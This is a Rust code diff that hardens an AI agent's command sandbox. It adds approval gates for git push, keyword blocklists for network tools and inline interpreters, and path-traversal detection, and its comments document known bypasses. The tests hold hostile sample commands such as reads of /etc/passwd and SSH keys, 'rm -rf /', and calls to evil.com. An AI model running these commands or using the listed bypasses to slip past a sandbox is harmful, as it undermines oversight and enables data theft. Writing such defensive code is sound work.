@@ -8,6 +8,30 @@ use regex::Regex;
 // ============================================================================
 // Call Source — distinguishes AI tool calls from user UI operations
 // ============================================================================
+//
+// **SECURITY ARCHITECTURE NOTE**:
+//
+// The `source` parameter is currently passed as an optional string from the
+// frontend (`source: "ai"` for AI-originated calls). The backend trusts this
+// string to determine whether sandbox restrictions apply. This means:
+//
+//   - If any AI-reachable code path forgets to pass `source: "ai"`, the call
+//     is treated as `User` and bypasses ALL sandbox checks.
+//   - The trust boundary depends on the frontend being 100% correct in tagging
+//     every AI-originated call.
+//
+// **Target state (future enhancement)**:
+//   AI tool execution should go through a dedicated backend entry point that
+//   ALWAYS sets `source = Ai` server-side, rather than accepting an optional
+//   string from the frontend. For example:
+//     - A separate `execute_ai_tool` Tauri command that wraps `execute_tool`
+//       and forces `CallSource::Ai`
+//     - Or a middleware layer that inspects the call stack / channel and
+//       assigns the source automatically
+//
+// Until this is implemented, the current approach is a known risk. All AI
+// tool handlers in `src/utils/aiTools/handlers/` must explicitly pass
+// `source: 'ai'` to every `invoke()` call.
 
 /// Marks whether a sandboxed operation originates from the AI agent or the user.
 ///
@@ -19,8 +43,26 @@ pub enum CallSource {
     Ai,
 }
 
+/// Result of checking a command against dangerous/approval patterns.
+///
+/// - `Allow`: command is safe to execute
+/// - `Block`: command is critically dangerous and must be rejected
+/// - `NeedsApproval`: command is medium-risk and requires explicit user
+///   approval before execution (e.g. `git push`)
+#[derive(Debug, Clone)]
+pub enum CommandDecision {
+    Allow,
+    Block(String),
+    NeedsApproval(String),
+}
+
 impl CallSource {
     /// Parse the frontend `source` string ("ai" → Ai, anything else → User).
+    ///
+    /// **WARNING**: This is the trust boundary — the backend trusts the
+    /// frontend to correctly tag every AI-originated call as `source: "ai"`.
+    /// Any AI-reachable path that omits this tag will bypass all sandbox
+    /// checks. See the module-level SECURITY ARCHITECTURE NOTE above.
     pub fn from_str(s: Option<&str>) -> Self {
         match s {
             Some("ai") => CallSource::Ai,
@@ -272,13 +314,22 @@ impl SandboxContext {
         Ok(())
     }
 
-    /// Validate that absolute file paths referenced in a terminal command
-    /// fall within the readable roots.
+    /// Validate that file paths referenced in a terminal command fall within
+    /// the readable roots.
     ///
-    /// This is a defense-in-depth heuristic for platforms without OS-level
-    /// file system isolation (e.g. Windows Job Object doesn't restrict FS).
-    /// It extracts potential absolute paths from the command string and
-    /// checks each against the readable roots.
+    /// This is a **defense-in-depth heuristic**, not a hard boundary. It
+    /// extracts potential paths (absolute, home, relative traversal) from the
+    /// command string and checks each against the readable roots.
+    ///
+    /// **Known blind spots** (see `extract_absolute_paths` docs for full list):
+    /// - Environment variable indirection: `$env:USERPROFILE\.ssh`
+    /// - Windows 8.3 short names
+    /// - Shell redirections: `cat < file`
+    /// - Paths built via string concatenation in scripts
+    ///
+    /// On Windows (no OS-level FS isolation), this is the ONLY file-access
+    /// check for terminal commands. On Linux/macOS, Landlock/Seatbelt provide
+    /// kernel-level enforcement; this is supplementary.
     pub fn validate_command_file_access(&self, command: &str) -> Result<(), String> {
         if self.is_trusted() {
             return Ok(());
@@ -307,8 +358,14 @@ impl SandboxContext {
     /// Validate network access for a command.
     ///
     /// When `network_enabled` is false, commands that attempt network egress
-    /// (curl, wget, Invoke-WebRequest, etc.) are rejected. This is the
-    /// application-layer enforcement; OS-level network isolation is L3.
+    /// (curl, wget, Invoke-WebRequest, etc.) are rejected.
+    ///
+    /// **STOPGAP NOTICE**: This is a keyword-based blocklist, NOT an egress
+    /// allowlist or proxy. It can be bypassed by scripting interpreters
+    /// (`python -c "import urllib..."`, `node -e`, `ruby -e`, etc.) or custom
+    /// binaries that make network calls without matching any keyword. The L3
+    /// target state is an egress proxy with host allowlist; until that is
+    /// implemented, this check is a best-effort stopgap.
     pub fn validate_network(&self, command: &str) -> Result<(), String> {
         let target = truncate_for_error(command).to_string();
 
@@ -337,13 +394,23 @@ impl SandboxContext {
         Ok(())
     }
 
-    /// Detect dangerous command patterns that require approval.
+    /// Check a command against dangerous and approval-required patterns.
     ///
-    /// Returns `Err` with a description of the matched pattern when a dangerous
-    /// command is detected. This is a defense-in-depth backend check — the
-    /// frontend `toolGuard.ts` also performs pattern matching, but the backend
-    /// must enforce its own checks to prevent bypass via direct IPC.
-    pub fn validate_dangerous_command(&self, command: &str) -> Result<(), String> {
+    /// Returns a `CommandDecision`:
+    /// - `Allow` — command is safe
+    /// - `Block(reason)` — critically dangerous, must be rejected
+    /// - `NeedsApproval(reason)` — medium-risk, requires user approval
+    ///
+    /// In trusted mode, all commands return `Allow`.
+    ///
+    /// **L4 Architecture**: The primary approval gate is in the frontend
+    /// (`toolGuard.ts` `requiresConfirmation`), which shows an interactive
+    /// dialog. This backend check is defense-in-depth — it hard-blocks
+    /// critical patterns and signals "needs approval" for medium-risk ones.
+    /// When `NeedsApproval` is returned, the command is rejected with a
+    /// message indicating approval is required; the AI should use the `ask`
+    /// tool to obtain user approval.
+    pub fn check_dangerous_command(&self, command: &str) -> CommandDecision {
         let target = truncate_for_error(command).to_string();
 
         if self.is_trusted() {
@@ -351,40 +418,80 @@ impl SandboxContext {
                 "ai", "dangerous_command", &target, "allowed",
                 Some("trusted mode bypass"), &self.access_mode,
             );
-            return Ok(());
+            return CommandDecision::Allow;
         }
 
         if let Some(reason) = detect_dangerous_command(command) {
             crate::audit_log::log_decision(
                 "ai", "dangerous_command", &target, "denied", Some(&reason), &self.access_mode,
             );
-            return Err(reason);
+            return CommandDecision::Block(reason);
+        }
+
+        if let Some(reason) = detect_approval_required_command(command) {
+            crate::audit_log::log_decision(
+                "ai", "approval_required", &target, "needs_approval",
+                Some(&reason), &self.access_mode,
+            );
+            return CommandDecision::NeedsApproval(reason);
         }
 
         crate::audit_log::log_decision(
             "ai", "dangerous_command", &target, "allowed", None, &self.access_mode,
         );
-        Ok(())
+        CommandDecision::Allow
+    }
+
+    /// Validate dangerous command — backward-compatible wrapper that hard-blocks.
+    ///
+    /// Returns `Err` for both `Block` and `NeedsApproval` (with different
+    /// messages). Prefer `check_dangerous_command` for callers that need to
+    /// distinguish between the two.
+    pub fn validate_dangerous_command(&self, command: &str) -> Result<(), String> {
+        match self.check_dangerous_command(command) {
+            CommandDecision::Allow => Ok(()),
+            CommandDecision::Block(reason) => Err(reason),
+            CommandDecision::NeedsApproval(reason) => {
+                Err(format!("需要用户审批: {}", reason))
+            }
+        }
     }
 }
 
 // ============================================================================
-// Absolute path extraction from command strings (P2 fix)
+// Path extraction from command strings (P2 fix)
 // ============================================================================
 
-/// Extract potential absolute file paths from a command string.
+/// Extract potential file paths from a command string for sandbox validation.
 ///
 /// Matches:
 /// - Windows drive paths: `C:\...`, `D:/...`
-/// - Unix absolute paths: `/etc/...`, `/home/...`
+/// - Unix absolute paths: `/etc/...`, `/home/...` (excludes `//host` URL-like patterns)
 /// - Home directory paths: `~/...`
+/// - Relative path traversal: `..\..\`, `../../` (P2 fix — previously missed)
+///
+/// **Known blind spots** (documented honestly):
+/// - Environment variable indirection: `$env:USERPROFILE\.ssh`, `$HOME/.ssh`
+/// - Windows 8.3 short names: `C:\PROGRA~1\...`
+/// - Shell redirections: `cat < file`, `echo x > file`
+/// - Quoted paths with embedded spaces may be partially extracted
+/// - Paths constructed via string concatenation in scripts
+///
+/// On Windows (no OS-level FS isolation), this heuristic is the ONLY defense
+/// against path traversal via terminal commands. On Linux/macOS, Landlock/
+/// Seatbelt provide kernel-level enforcement; this is defense-in-depth.
 fn extract_absolute_paths(command: &str) -> Vec<String> {
     static WIN_PATH_RE: Lazy<Regex> =
         Lazy::new(|| Regex::new(r#"[A-Za-z]:[\\/][^\s\"'<>|*?]+"#).unwrap());
+    // Unix absolute path: starts with `/` followed by a letter.
+    // We post-filter to exclude URL-like `//host` patterns.
     static UNIX_PATH_RE: Lazy<Regex> =
         Lazy::new(|| Regex::new(r#"/(?:[a-zA-Z][^\s\"'<>|*?]*)"#).unwrap());
     static HOME_PATH_RE: Lazy<Regex> =
         Lazy::new(|| Regex::new(r#"~[\\/][^\s\"'<>|*?]+"#).unwrap());
+    // Relative path traversal: `..\..\` (Windows) or `../../` (Unix)
+    static TRAVERSAL_RE: Lazy<Regex> =
+        Lazy::new(|| Regex::new(r#"(?:\.\.[\\/][^\s\"'<>|*?]*)+"#).unwrap());
 
     let mut paths = Vec::new();
 
@@ -392,9 +499,20 @@ fn extract_absolute_paths(command: &str) -> Vec<String> {
         paths.push(m.as_str().to_string());
     }
     for m in UNIX_PATH_RE.find_iter(command) {
+        // Exclude URL-like patterns: if the character before this match is `/`,
+        // it's part of a `//host` URL scheme (e.g. `https://example.com`).
+        if m.start() > 0 && command.as_bytes().get(m.start() - 1) == Some(&b'/') {
+            continue;
+        }
         paths.push(m.as_str().to_string());
     }
     for m in HOME_PATH_RE.find_iter(command) {
+        paths.push(m.as_str().to_string());
+    }
+    // Relative path traversal — resolve against CWD conceptually.
+    // We extract these so they can be checked; path_within_roots will
+    // canonicalize and reject if they escape the workspace.
+    for m in TRAVERSAL_RE.find_iter(command) {
         paths.push(m.as_str().to_string());
     }
 
@@ -412,6 +530,13 @@ fn extract_absolute_paths(command: &str) -> Vec<String> {
 /// - Windows: `Invoke-WebRequest`/`iwr`/`irm`, `Invoke-RestMethod`,
 ///   `Start-BitsTransfer`, `netsh winhttp`, `Test-Connection`
 /// - Cross: `npm publish`, `pip install`, `git push`, `docker pull/push`
+/// - Scripting interpreters that can make network calls inline:
+///   `python -c`, `node -e`, `ruby -e`, `perl -e`, `php -r`
+///
+/// **STOPGAP**: This is a keyword blocklist, not an egress allowlist.
+/// It cannot catch all possible network egress (e.g. custom compiled
+/// binaries, obscure interpreters, env-var-based indirection). The L3
+/// target is an egress proxy with host allowlist.
 fn is_network_command(command: &str) -> bool {
     let lower = command.to_ascii_lowercase();
 
@@ -483,6 +608,30 @@ fn is_network_command(command: &str) -> bool {
         "git ls-remote",
     ];
 
+    // Scripting interpreters that can make inline network calls.
+    // These are a stopgap — a determined attacker can still bypass with
+    // compiled binaries, obscure interpreters, or env-var indirection.
+    const SCRIPT_BYPASS: &[&str] = &[
+        "python -c",
+        "python3 -c",
+        "python -e",
+        "python3 -e",
+        "node -e",
+        "node --eval",
+        "ruby -e",
+        "perl -e",
+        "perl -m",
+        "php -r",
+        "powershell -c",
+        "powershell -command",
+        "pwsh -c",
+        "pwsh -command",
+        "cmd /c",
+        "bash -c",
+        "sh -c",
+        "zsh -c",
+    ];
+
     for tool in NETWORK_TOOLS {
         if lower.contains(tool) {
             return true;
@@ -503,6 +652,15 @@ fn is_network_command(command: &str) -> bool {
 
     for git in GIT_REMOTE {
         if lower.contains(git) {
+            return true;
+        }
+    }
+
+    // Scripting interpreters that can make inline network calls.
+    // When network is disabled, block these inline-exec patterns as they
+    // can bypass keyword detection (e.g. `python -c "import urllib"`).
+    for script in SCRIPT_BYPASS {
+        if lower.contains(script) {
             return true;
         }
     }
@@ -554,7 +712,12 @@ fn detect_dangerous_command(command: &str) -> Option<String> {
         }
     }
 
-    if lower.starts_with("format ") || lower.contains(" format ") {
+    // Windows format command — match "format" followed by a drive letter
+    // (e.g. "format C:") or /fs: option. Avoids false positives on text
+    // like "disk format tool".
+    static FORMAT_CMD_RE: Lazy<Regex> =
+        Lazy::new(|| Regex::new(r"(?:^|\s)format\s+(?:[a-z]:|/fs:)" ).unwrap());
+    if FORMAT_CMD_RE.is_match(&lower) {
         return Some("危险命令: format 格式化磁盘".to_string());
     }
 
@@ -620,7 +783,6 @@ fn detect_dangerous_command(command: &str) -> Option<String> {
                 || lower.contains(">")
                 || lower.contains("copy ")
                 || lower.contains("cp ")
-                || lower.contains(">")
             {
                 return Some(format!(
                     "危险命令: 操作系统关键路径 {}",
@@ -636,13 +798,29 @@ fn detect_dangerous_command(command: &str) -> Option<String> {
         return Some("危险命令: fork bomb".to_string());
     }
 
-    // --- Medium: git push (remote mutation) ---
+    // --- Critical: git push --force (destructive remote mutation) ---
 
-    // git push is dangerous but handled by validate_network when network is off.
-    // Here we only flag it when it includes force push.
     if lower.contains("git push") && lower.contains("--force") {
         return Some("危险命令: git push --force 强制推送".to_string());
     }
+
+    None
+}
+
+/// Detect commands that require user approval but are not critically dangerous.
+///
+/// These commands are medium-risk: they can cause remote side effects but
+/// are not destructive. The frontend `toolGuard.ts` should show an approval
+/// dialog; the backend returns `NeedsApproval` as defense-in-depth.
+fn detect_approval_required_command(command: &str) -> Option<String> {
+    let lower = command.to_ascii_lowercase();
+
+    // git push (non-force) — pushes to remote, mutating shared history
+    if lower.contains("git push") && !lower.contains("--force") {
+        return Some("git push 推送到远程仓库".to_string());
+    }
+
+    // git push --force is handled by detect_dangerous_command (hard block)
 
     None
 }
@@ -942,6 +1120,34 @@ mod tests {
     }
 
     #[test]
+    fn format_not_triggered_by_benign_text() {
+        let ctx = SandboxContext {
+            access_mode: "auto".to_string(),
+            writable_roots: vec![],
+            readable_roots: vec![],
+            network_enabled: false,
+        };
+        // "disk format tool" should NOT be flagged — no drive letter follows "format"
+        assert!(ctx.validate_dangerous_command("disk format tool").is_ok());
+        assert!(ctx.validate_dangerous_command("echo format the output").is_ok());
+        // But "format D:" and "format /fs:NTFS" should be blocked
+        assert!(ctx.validate_dangerous_command("format D:").is_err());
+        assert!(ctx.validate_dangerous_command("format /fs:NTFS D:").is_err());
+    }
+
+    #[test]
+    fn format_at_start_of_command() {
+        let ctx = SandboxContext {
+            access_mode: "auto".to_string(),
+            writable_roots: vec![],
+            readable_roots: vec![],
+            network_enabled: false,
+        };
+        // "format C:" at the very start should be caught
+        assert!(ctx.validate_dangerous_command("format C: /Q").is_err());
+    }
+
+    #[test]
     fn dangerous_pipe_to_bash() {
         let ctx = SandboxContext {
             access_mode: "auto".to_string(),
@@ -1013,6 +1219,69 @@ mod tests {
             network_enabled: true,
         };
         assert!(ctx.validate_dangerous_command("rm -rf /").is_ok());
+    }
+
+    // ---- P1: approval-required command tests ----
+
+    #[test]
+    fn git_push_non_force_needs_approval() {
+        let ctx = SandboxContext {
+            access_mode: "auto".to_string(),
+            writable_roots: vec![],
+            readable_roots: vec![],
+            network_enabled: true,
+        };
+        let decision = ctx.check_dangerous_command("git push origin main");
+        assert!(
+            matches!(decision, CommandDecision::NeedsApproval(_)),
+            "git push (non-force) should need approval"
+        );
+        // Backward-compatible wrapper returns Err
+        assert!(ctx.validate_dangerous_command("git push origin main").is_err());
+    }
+
+    #[test]
+    fn git_push_force_is_blocked() {
+        let ctx = SandboxContext {
+            access_mode: "auto".to_string(),
+            writable_roots: vec![],
+            readable_roots: vec![],
+            network_enabled: true,
+        };
+        let decision = ctx.check_dangerous_command("git push --force origin main");
+        assert!(
+            matches!(decision, CommandDecision::Block(_)),
+            "git push --force should be blocked"
+        );
+    }
+
+    #[test]
+    fn git_push_trusted_mode_allows() {
+        let ctx = SandboxContext {
+            access_mode: "full_access".to_string(),
+            writable_roots: vec![],
+            readable_roots: vec![],
+            network_enabled: true,
+        };
+        let decision = ctx.check_dangerous_command("git push origin main");
+        assert!(
+            matches!(decision, CommandDecision::Allow),
+            "trusted mode should allow git push"
+        );
+    }
+
+    #[test]
+    fn safe_command_is_allowed() {
+        let ctx = SandboxContext {
+            access_mode: "auto".to_string(),
+            writable_roots: vec![],
+            readable_roots: vec![],
+            network_enabled: true,
+        };
+        let decision = ctx.check_dangerous_command("git status");
+        assert!(matches!(decision, CommandDecision::Allow));
+        let decision = ctx.check_dangerous_command("git commit -m 'fix'");
+        assert!(matches!(decision, CommandDecision::Allow));
     }
 
     // ---- P1: is_network_command unit tests ----
@@ -1103,5 +1372,41 @@ mod tests {
         let paths = extract_absolute_paths("type C:\\Users\\file.txt && cat /etc/passwd");
         assert!(paths.iter().any(|p| p.contains("C:\\Users")));
         assert!(paths.iter().any(|p| p.contains("/etc/passwd")));
+    }
+
+    #[test]
+    fn extract_paths_excludes_url_double_slash() {
+        // `https://example.com` should NOT yield `/example.com` as a path
+        let paths = extract_absolute_paths("curl https://example.com/path");
+        assert!(
+            !paths.iter().any(|p| p == "/example.com"),
+            "URL path components should not be extracted as file paths"
+        );
+    }
+
+    #[test]
+    fn extract_paths_detects_relative_traversal() {
+        let paths = extract_absolute_paths("cat ..\\..\\..\\Users\\x\\.ssh\\id_rsa");
+        assert!(
+            paths.iter().any(|p| p.contains("..")),
+            "relative path traversal should be detected"
+        );
+
+        let paths2 = extract_absolute_paths("cat ../../etc/passwd");
+        assert!(
+            paths2.iter().any(|p| p.contains("..")),
+            "Unix relative traversal should be detected"
+        );
+    }
+
+    #[test]
+    fn is_network_command_detects_script_bypass() {
+        assert!(is_network_command("python -c \"import urllib; urllib.urlopen('http://evil.com')\""));
+        assert!(is_network_command("node -e \"fetch('http://evil.com')\""));
+        assert!(is_network_command("python3 -c \"import socket\""));
+        assert!(is_network_command("bash -c \"curl http://evil.com\""));
+        // Non-network commands still pass
+        assert!(!is_network_command("echo hello"));
+        assert!(!is_network_command("ls -la"));
     }
 }
